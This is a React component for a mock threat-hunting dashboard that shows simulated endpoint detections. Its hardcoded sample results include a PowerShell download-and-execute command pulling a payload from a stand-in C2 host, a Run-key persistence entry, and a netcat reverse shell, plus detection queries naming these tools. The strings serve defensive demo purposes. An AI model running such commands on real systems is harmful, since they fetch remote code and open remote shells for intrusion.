'use client';

import React, { useState } from 'react';
import { Crosshair, Terminal, Play, Search, ShieldAlert, Cpu } from 'lucide-react';

export default function ThreatHunting() {
  const [huntType, setHuntType] = useState<'process' | 'registry' | 'dns' | 'tasks'>('process');
  const [query, setQuery] = useState('process.name == "powershell.exe" && process.command_line contains "-nop"');
  const [scanning, setScanning] = useState(false);
  const [results, setResults] = useState<any[]>([]);

  const handleRunHunt = (e: React.FormEvent) => {
    e.preventDefault();
    setScanning(true);
    setResults([]);

    setTimeout(() => {
      // Return structured mocks based on type
      if (huntType === 'process') {
        setResults([
          { host: 'srv-dmz-web-01', user: 'root', detail: 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil-c2-server.net/payload.ps1\')"', severity: 'Critical', time: '10 mins ago' },
          { host: 'wkst-jdoe-01', user: 'jdoe', detail: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host \'Checking connection...\'"', severity: 'Low', time: '1 hour ago' }
        ]);
      } else if (huntType === 'registry') {
        setResults([
          { host: 'wkst-msmith-02', user: 'SYSTEM', detail: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AegisBackdoor = "C:\\Windows\\Temp\\payload.exe"', severity: 'High', time: '2 hours ago' }
        ]);
      } else if (huntType === 'dns') {
        setResults([
          { host: '192.168.1.50', user: 'WebDaemon', detail: 'DNS Query for "evil-c2-server.net" (Type A)', severity: 'High', time: '4 mins ago' },
          { host: '192.168.1.100', user: 'jdoe', detail: 'DNS Query for "malicious-phishing.org" (Type A)', severity: 'Medium', time: '40 mins ago' }
        ]);
      } else {
        setResults([
          { host: 'srv-corp-dc-01', user: 'Administrator', detail: 'Scheduled Task "WindowsUpdateMaintenance" executing cmd.exe /c start NC.EXE 192.168.1.10 4444 -e cmd.exe', severity: 'Critical', time: '30 mins ago' }
        ]);
      }
      setScanning(false);
    }, 1500);
  };

  return (
    <div className="space-y-6">
      
      {/* Header */}
      <div>
        <h2 className="text-2xl font-bold tracking-wide text-slate-100 uppercase">
          Proactive Threat Hunting
        </h2>
        <p className="text-xs text-slate-500 font-mono mt-0.5">
          ENDPOINT SEARCH // TELEMETRY CORRELATION // LOG STACKING ANALYSIS
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        
        {/* Left Side: Parameters panel */}
        <div className="glass-panel p-5 rounded-xl border-slate-800 space-y-4 h-fit">
          <h3 className="text-xs uppercase text-slate-400 font-mono tracking-widest font-bold border-b border-slate-850 pb-2 flex items-center gap-2">
            <Crosshair className="w-4 h-4 text-neon-cyan animate-pulse" /> Hunt Parameters
          </h3>

          <div className="space-y-3 font-mono text-xs">
            <div className="flex flex-col gap-1">
              <label className="text-[10px] text-slate-500 uppercase">Hunt Scope Target</label>
              <div className="flex flex-col gap-1.5">
                {[
                  { id: 'process', label: 'Process Executions' },
                  { id: 'registry', label: 'Registry Runkeys' },
                  { id: 'dns', label: 'DNS Telemetry' },
                  { id: 'tasks', label: 'Scheduled Tasks' }
                ].map((type) => (
                  <button
                    key={type.id}
                    onClick={() => {
                      setHuntType(type.id as any);
                      if (type.id === 'process') setQuery('process.name == "powershell.exe" && process.command_line contains "-nop"');
                      else if (type.id === 'registry') setQuery('registry.path contains "\\Run\\" && registry.value contains "Temp"');
                      else if (type.id === 'dns') setQuery('dns.query == "evil-c2-server.net"');
                      else setQuery('task.command contains "cmd.exe" || task.command contains "nc.exe"');
                    }}
                    className={`py-2 px-3 rounded text-left border transition-all duration-300 cursor-pointer ${
                      huntType === type.id
                        ? 'bg-neon-cyan/15 border-neon-cyan text-neon-cyan'
                        : 'bg-slate-950 border-slate-850 text-slate-400 hover:border-slate-800'
                    }`}
                  >
                    {type.label}
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Right Side: Hunt Output Terminal */}
        <div className="lg:col-span-3 flex flex-col gap-6">
          {/* Query bar */}
          <form onSubmit={handleRunHunt} className="glass-panel p-4 rounded-xl border-slate-800 flex gap-2">
            <div className="relative flex-1">
              <span className="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-500">
                <Terminal className="w-4 h-4" />
              </span>
              <input
                type="text"
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                required
                className="w-full bg-slate-950 border border-slate-850 rounded-lg py-2.5 pl-10 pr-4 text-xs text-slate-200 focus:outline-none focus:border-neon-cyan font-mono"
              />
            </div>
            <button
              type="submit"
              disabled={scanning}
              className="px-5 py-2.5 rounded bg-neon-cyan text-black hover:bg-neon-cyan/80 font-extrabold text-xs uppercase tracking-wider flex items-center gap-1.5 transition-all duration-300 disabled:opacity-50 cursor-pointer shadow-[0_0_15px_rgba(0,240,255,0.15)]"
            >
              <Play className="w-4.5 h-4.5 fill-black" />
              <span>Launch Scan</span>
            </button>
          </form>

          {/* Hunt Results Log Console */}
          <div className="glass-panel rounded-xl border-slate-800 p-6 flex flex-col min-h-[300px]">
            <span className="text-xs uppercase text-slate-400 font-mono tracking-widest font-bold border-b border-slate-850 pb-3 block">
              Hunting Indicators Results Grid
            </span>
            
            <div className="flex-1 overflow-x-auto mt-4">
              {scanning ? (
                <div className="h-full min-h-[200px] flex flex-col items-center justify-center text-slate-500 font-mono text-xs gap-3">
                  <span className="w-8 h-8 rounded-full border-2 border-t-neon-cyan border-slate-800 animate-spin" />
                  <span>BROADCASTING HUNG QUERYS ACROSS CORPORATE ENDPOINTS...</span>
                </div>
              ) : results.length > 0 ? (
                <table className="w-full text-left text-xs font-mono">
                  <thead className="bg-[#090b1c]/80 text-slate-400 uppercase tracking-widest text-[9px] border-b border-slate-850">
                    <tr>
                      <th className="p-3">Endpoint Host</th>
                      <th className="p-3">Execution context</th>
                      <th className="p-3">Telemetry Payload</th>
                      <th className="p-3">Risk Severity</th>
                      <th className="p-3">Timeline</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-850/60">
                    {results.map((res, index) => (
                      <tr key={index} className="hover:bg-slate-900/20 text-slate-350">
                        <td className="p-3 font-semibold text-slate-200">{res.host}</td>
                        <td className="p-3 text-neon-cyan">{res.user}</td>
                        <td className="p-3 max-w-[280px] truncate text-[10px] bg-black/30 text-slate-400 p-1.5 rounded">{res.detail}</td>
                        <td className="p-3">
                          <span className={`px-2 py-0.5 rounded border text-[9px] font-bold uppercase ${
                            res.severity === 'Critical' ? 'text-neon-red border-neon-red/20 bg-neon-red/5' :
                            res.severity === 'High' ? 'text-orange-400 border-orange-400/20 bg-orange-400/5' :
                            'text-neon-yellow border-neon-yellow/20 bg-neon-yellow/5'
                          }`}>
                            {res.severity}
                          </span>
                        </td>
                        <td className="p-3 text-slate-500 whitespace-nowrap">{res.time}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              ) : (
                <div className="h-full min-h-[200px] flex items-center justify-center text-xs text-slate-650 font-mono text-center px-8">
                  NO ACTIVE INDICATORS DETECTED. CONFIGURE PARAMS AND LAUNCH THE HUNTING SCAN.
                </div>
              )}
            </div>
          </div>
        </div>

      </div>

    </div>
  );
}
